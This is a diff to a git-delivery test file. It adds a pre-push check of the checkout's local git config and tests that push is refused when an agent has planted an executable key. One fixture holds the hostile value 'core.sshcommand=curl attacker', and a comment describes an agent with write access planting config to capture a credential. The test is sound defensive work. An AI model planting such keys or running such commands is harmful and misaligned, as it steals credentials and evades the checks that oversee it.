@@ -1,6 +1,7 @@
 import { describe, it, expect, vi } from "vitest";
 import { createDelivery } from "./delivery.js";
 import { CommandResult } from "./exec.js";
+import { deliveryGitArgs } from "./git-safety.js";
 import { ClaimedTask } from "./types.js";
 
 const task: ClaimedTask = {
@@ -32,8 +33,13 @@ function fakeCli(responses: Record<string, Partial<CommandResult>>) {
   return { runner: { run }, run };
 }
 
+// push begins with a `git config --local --list` pre-flight (see refuseIfPlanted), which is not the
+// call any of these assertions is about.
 function argsOf(run: ReturnType<typeof vi.fn>, index = 0): string[] {
-  return run.mock.calls[index][1] as string[];
+  const calls = run.mock.calls.filter(
+    ([, args]) => !withoutConfigFlags(args as string[]).join(" ").startsWith("config --local")
+  );
+  return calls[index][1] as string[];
 }
 
 function valueOf(args: string[], flag: string): string {
@@ -47,18 +53,7 @@ describe("push", () => {
 
     expect(run).toHaveBeenCalledWith(
       "git",
-      [
-        "-c",
-        "core.fsmonitor=false",
-        "-c",
-        "core.pager=cat",
-        "push",
-        "--force-with-lease",
-        "-u",
-        "origin",
-        "--",
-        "cp-158/worker",
-      ],
+      deliveryGitArgs(["push", "--no-verify", "--force-with-lease", "-u", "origin", "--", "cp-158/worker"]),
       expect.objectContaining({ cwd: "/wt" })
     );
   });
@@ -80,8 +75,25 @@ describe("push", () => {
   });
 
   it("names the timeout instead of throwing an empty error when the push hangs", async () => {
-    const run = vi.fn().mockResolvedValue({ code: -1, stdout: "", stderr: "", timedOut: true });
-    await expect(createDelivery({ run }).push("/wt", "cp-158/worker")).rejects.toThrow(/timed out/);
+    const { runner } = fakeCli({ "git push": { code: -1, timedOut: true } });
+    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(/timed out/);
+  });
+
+  // bindRepository scanned this config before the agent ever saw the checkout, and the agent holds
+  // Write; push is the call that hands whatever it planted a credential
+  it("refuses to push when the agent planted an executable key in the checkout's config", async () => {
+    const { runner } = fakeCli({
+      "git config --local --list": { stdout: "core.sshcommand=curl attacker\n" },
+    });
+    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(
+      /core\.sshcommand/
+    );
+  });
+
+  it("does not push when the config cannot be read at all", async () => {
+    const { runner, run } = fakeCli({ "git config --local --list": { code: 128 } });
+    await expect(createDelivery(runner).push("/wt", "cp-158/worker")).rejects.toThrow(/refusing/);
+    expect(run.mock.calls.some(([, args]) => (args as string[]).includes("push"))).toBe(false);
   });
 
   // The repository was approved by bindRepository, but its own gitconfig (credential.helper,
